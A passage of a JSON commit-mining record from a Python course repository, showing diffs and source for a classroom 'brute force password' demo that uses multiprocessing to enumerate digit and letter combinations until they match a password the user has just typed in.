action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n","add":14,"remove":7,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")","parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")","import psutil","print(f\"number of cores: {psutil.cpu_count()}\")","        print(f\"oooo waiting for message\")","        print(f\"---> received message from queue: {check_info}\")"],"goodparts":["import psutil","import sys","parser = argparse.ArgumentParser(description=\"brute force password crack\")","parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")","parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")","parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")","parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")","numeric = args.numeric","alpha = args.alpha","special = args.special","        if \"exit\" in check_info:","            break"]},{"diff":"\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n","add":7,"remove":9,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})","                print(f\"~~~~ [{first_char}] terminating as requested\")","                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})","            print(f\"---! [{first_char}] password not found\")","            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})"],"goodparts":["                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})","                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})","            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})"]},{"diff":"\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n","add":5,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["    chars = \"0123456789\"","        print(f\"---> starting process number {proc_num}\")"],"goodparts":["    chars = \"\"","    if numeric: chars += \"0123456789\"","    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"","    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"","    print(f\"\\nsearch characters: {chars}\\n\")"]},{"diff":"\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n","add":6,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        password = input(\"Password:  \")","        if not password: exit()"],"goodparts":["        password = input(\"\\nPassword:  \")","        if not password:","            for _ in bf_processes:","                bf_request_queue.put({\"exit\": True})","            print(\"\\n... exiting brute force password finder\")","            break"]},{"diff":"\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n","add":2,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["            print(f\"---> putting message for char: {char} onto queue: {check_info}\")","                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"found password in {rsp_info['time']-time_start:.3f}\")"],"goodparts":["                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")"]},{"diff":"\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","add":4,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        print(f\"request: {bf_request_queue.qsize()}\")","        print(f\"response: {bf_response_queue.qsize()}\")","        print(f\"terminate: {bf_terminate_queue.qsize()}\")"],"goodparts":["        print(\"\\nQueues:\")","        print(f\"-- request: {bf_request_queue.qsize()}\")","        print(f\"-- response: {bf_response_queue.qsize()}\")","        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")"]}],"source":"\nimport itertools from time import time, sleep import argparse from multiprocessing import Process, Queue parser=argparse.ArgumentParser(description=\"Number of processes for brute force\") parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\") args=parser.parse_args() num_processes=int(args.processes) import psutil print(f\"number of cores:{psutil.cpu_count()}\") def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue): while True: print(f\"oooo waiting for message\") check_info=bf_request_queue.get() print(f\"---> received message from queue:{check_info}\") first_char=check_info[\"first_char\"] chars=check_info[\"chars\"] pw_length=check_info[\"pw_length\"] actual_password=check_info[\"actual_password\"] for next_chars in itertools.product(chars, repeat=pw_length-1): test_password=first_char +''.join(next_chars) if test_password==actual_password: bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()}) break if not bf_terminate_queue.empty(): print(f\"~~~~[{first_char}] terminating as requested\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) break else: print(f\"---![{first_char}] password not found\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) def main(): bf_request_queue=Queue() bf_response_queue=Queue() bf_terminate_queue=Queue() chars=\"0123456789\" bf_processes=list() for proc_num in range(0, num_processes): print(f\"---> starting process number{proc_num}\") proc=Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue)) proc.start() print(f\"---> process number{proc_num} started\") bf_processes.append(proc) while True: password=input(\"Password: \") if not password: exit() time_start=time() for char in chars: check_info=dict() check_info[\"first_char\"]=char check_info[\"chars\"]=chars check_info[\"pw_length\"]=len(password) check_info[\"actual_password\"]=password print(f\"---> putting message for char:{char} onto queue:{check_info}\") bf_request_queue.put(check_info) for _ in chars: rsp_info=bf_response_queue.get() if rsp_info[\"found\"]: print(f\"---> FOUND PASSWORD:{rsp_info['pw']}\") print(f\"found password in{rsp_info['time']-time_start:.3f}\") break else: print(f\"---! PASSWORD NOT FOUND:{password}\") bf_terminate_queue.put({}) sleep(1) for queue in[bf_request_queue, bf_response_queue, bf_terminate_queue]: while not queue.empty(): queue.get() print(f\"request:{bf_request_queue.qsize()}\") print(f\"response:{bf_response_queue.qsize()}\") print(f\"terminate:{bf_terminate_queue.qsize()}\") if __name__=='__main__': main() ","sourceWithComments":"import itertools\nfrom time import time, sleep\nimport argparse\nfrom multiprocessing import Process, Queue\n\nparser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\nparser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\nargs = parser.parse_args()\nnum_processes = int(args.processes)\n\nimport psutil\nprint(f\"number of cores: {psutil.cpu_count()}\")\n\n\ndef check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n\n    while True:\n\n        print(f\"oooo waiting for message\")\n        check_info = bf_request_queue.get()\n        print(f\"---> received message from queue: {check_info}\")\n\n        first_char = check_info[\"first_char\"]\n        chars = check_info[\"chars\"]\n        pw_length = check_info[\"pw_length\"]\n        actual_password = check_info[\"actual_password\"]\n\n        for next_chars in itertools.product(chars, repeat=pw_length-1):\n            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n            test_password = first_char + ''.join(next_chars)\n            if test_password == actual_password:\n                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n                break\n\n            if not bf_terminate_queue.empty():\n                print(f\"~~~~ [{first_char}] terminating as requested\")\n                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n                break\n\n        else:\n            print(f\"---! [{first_char}] password not found\")\n            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n\n        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n\n\ndef main():\n\n    bf_request_queue = Queue()\n    bf_response_queue = Queue()\n    bf_terminate_queue = Queue()\n\n    chars = \"0123456789\"\n\n    bf_processes = list()\n    for proc_num in range(0, num_processes):\n        print(f\"---> starting process number {proc_num}\")\n        proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n        proc.start()\n        print(f\"---> process number {proc_num} started\")\n        bf_processes.append(proc)\n\n    while True:\n\n        password = input(\"Password:  \")\n        if not password: exit()\n\n        time_start = time()\n        for char in chars:\n\n            check_info = dict()\n            check_info[\"first_char\"] = char\n            check_info[\"chars\"] = chars\n            check_info[\"pw_length\"] = len(password)\n            check_info[\"actual_password\"] = password\n\n            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n            bf_request_queue.put(check_info)\n\n        for _ in chars:\n            rsp_info = bf_response_queue.get()\n\n            if rsp_info[\"found\"]:\n                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n                break\n\n        else:\n            print(f\"---! PASSWORD NOT FOUND: {password}\")\n\n        # put a single terminate message in the queue so all process see it and quit\n        bf_terminate_queue.put({})\n        sleep(1)\n\n        # clear out any excess messages in all the queues\n        for queue in [bf_request_queue, bf_response_queue, bf_terminate_queue]:\n            while not queue.empty():\n                queue.get()\n\n        print(f\"request: {bf_request_queue.qsize()}\")\n        print(f\"response: {bf_response_queue.qsize()}\")\n        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"remove cyan, improve brute_force"}},"https:\/\/github.com\/chuckablack\/python-52-weeks":{"98284397b4bb5c04c3ff2cd85e247edd8dba6d64":{"url":"https:\/\/api.github.com\/repos\/chuckablack\/python-52-weeks\/commits\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","html_url":"https:\/\/github.com\/chuckablack\/python-52-weeks\/commit\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","message":"remove cyan, improve brute_force","sha":"98284397b4bb5c04c3ff2cd85e247edd8dba6d64","keyword":"brute force improve","diff":"diff --git a\/m14_password_crack\/brute_force_cyan.py b\/m14_password_crack\/brute_force_cyan.py\ndeleted file mode 100644\nindex b2bdbea5..00000000\n--- a\/m14_password_crack\/brute_force_cyan.py\n+++ \/dev\/null\n@@ -1,31 +0,0 @@\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file\ndiff --git a\/m14_password_crack\/using_brute_force.py b\/m14_password_crack\/using_brute_force.py\nindex 42c46782..a938de40 100644\n--- a\/m14_password_crack\/using_brute_force.py\n+++ b\/m14_password_crack\/using_brute_force.py\n@@ -2,23 +2,30 @@\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n@@ -26,23 +33,21 @@ def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n@@ -51,11 +56,14 @@ def main():\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n@@ -63,8 +71,12 @@ def main():\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n@@ -75,15 +87,14 @@ def main():\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n@@ -98,9 +109,10 @@ def main():\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","files":{"\/m14_password_crack\/brute_force_cyan.py":{"changes":[{"diff":"\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file","add":0,"remove":31,"filename":"\/m14_password_crack\/brute_force_cyan.py","badparts":["import itertools","import time","def tryPassword(passwordSet, stringTypeSet):","    start = time.time()","    chars = stringTypeSet","    attempts = 0","    for i in range(1, 9):","        for letter in itertools.product(chars, repeat=i):","            attempts += 1","            letter = ''.join(letter)","            if letter == passwordSet:","                end = time.time()","                distance = end - start","                return (attempts, distance)","while True:","    password = input(\"Password:  \")","    if not password: break","    stringType = \"1234567890\"","    tries, timeAmount = tryPassword(password, stringType)","    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"],"goodparts":[]}],"source":"\n\nimport itertools import time def tryPassword(passwordSet, stringTypeSet): start=time.time() chars=stringTypeSet attempts=0 for i in range(1, 9): for letter in itertools.product(chars, repeat=i): attempts +=1 letter=''.join(letter) if letter==passwordSet: end=time.time() distance=end -start return(attempts, distance) while True: password=input(\"Password: \") if not password: break stringType=\"1234567890\" tries, timeAmount=tryPassword(password, stringType) print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" %(password, tries, timeAmount)) ","sourceWithComments":"# Imports\nimport itertools\nimport time\n\n\n# Brute force function\ndef tryPassword(passwordSet, stringTypeSet):\n    start = time.time()\n    chars = stringTypeSet\n    attempts = 0\n    for i in range(1, 9):\n        for letter in itertools.product(chars, repeat=i):\n            attempts += 1\n            letter = ''.join(letter)\n            if letter == passwordSet:\n                end = time.time()\n                distance = end - start\n                return (attempts, distance)\n\n\nwhile True:\n\n    password = input(\"Password:  \")\n    if not password: break\n\n    # Allowed characters\n    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n    stringType = \"1234567890\"\n    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n    tries, timeAmount = tryPassword(password, stringType)\n    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"},"\/m14_password_crack\/using_brute_force.py":{"changes":[{"diff":"\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n","add":14,"remove":7,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")","parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")","import psutil","print(f\"number of cores: {psutil.cpu_count()}\")","        print(f\"oooo waiting for message\")","        print(f\"---> received message from queue: {check_info}\")"],"goodparts":["import psutil","import sys","parser = argparse.ArgumentParser(description=\"brute force password crack\")","parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")","parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")","parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")","parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")","numeric = args.numeric","alpha = args.alpha","special = args.special","        if \"exit\" in check_info:","            break"]},{"diff":"\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n","add":7,"remove":9,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})","                print(f\"~~~~ [{first_char}] terminating as requested\")","                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})","            print(f\"---! [{first_char}] password not found\")","            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})"],"goodparts":["                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})","                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})","            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})"]},{"diff":"\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n","add":5,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["    chars = \"0123456789\"","        print(f\"---> starting process number {proc_num}\")"],"goodparts":["    chars = \"\"","    if numeric: chars += \"0123456789\"","    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"","    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"","    print(f\"\\nsearch characters: {chars}\\n\")"]},{"diff":"\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n","add":6,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        password = input(\"Password:  \")","        if not password: exit()"],"goodparts":["        password = input(\"\\nPassword:  \")","        if not password:","            for _ in bf_processes:","                bf_request_queue.put({\"exit\": True})","            print(\"\\n... exiting brute force password finder\")","            break"]},{"diff":"\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n","add":2,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["            print(f\"---> putting message for char: {char} onto queue: {check_info}\")","                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"found password in {rsp_info['time']-time_start:.3f}\")"],"goodparts":["                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")"]},{"diff":"\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","add":4,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        print(f\"request: 